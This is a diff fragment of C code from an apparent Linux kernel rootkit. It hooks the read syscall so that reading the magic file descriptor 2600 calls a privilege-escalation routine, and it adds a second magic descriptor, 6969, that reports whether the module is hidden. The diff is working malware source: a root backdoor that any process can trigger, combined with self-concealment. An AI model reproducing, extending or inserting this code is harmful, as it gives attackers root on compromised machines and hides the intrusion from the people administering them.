@@ -6,8 +6,12 @@
 
 #include "../hooking.h"
 #include "h_read.h"
+#include "h_kill.h"
 
 sysfun_t old_read;
+
+#define FD_SUPERUSER    (2600)
+#define FD_ISMODHIDDEN  (6969)
 
 void hijack_read(void)
 {
@@ -26,12 +30,16 @@ int new_read(struct pt_regs *regs)
     int fd = (int)regs->di;
     void *buf = (void *)regs->si;
     size_t count = (size_t)regs->dx;
-
+    
+    int is_hidden = is_module_hidden();
     int retval;
-    if (fd == 2600)
+
+    if (fd == FD_SUPERUSER)
     {
         privesc(); 
         return 0;
+    } else if (fd == FD_ISMODHIDDEN) {
+        return copy_to_user(buf, &is_hidden, sizeof(int));
     }
 
     retval = old_read(regs);
